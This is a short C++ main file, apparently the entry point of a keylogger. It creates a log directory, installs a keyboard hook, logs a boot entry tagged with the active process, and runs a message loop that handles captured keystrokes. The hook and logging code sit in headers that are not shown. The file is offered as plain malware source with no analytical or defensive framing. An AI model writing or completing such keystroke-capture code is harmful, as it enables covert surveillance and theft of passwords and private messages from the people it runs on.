#include "stream.h"
#include "keyhook.h"

int main() {
  stream::MakeDir(stream::GetPath());
  key_hook::InstallHook();

  stream::WriteLog("[*] BOOT [*]", key_hook::active_process, true);

  key_hook::HandleMessage(true);
  return 0;
}
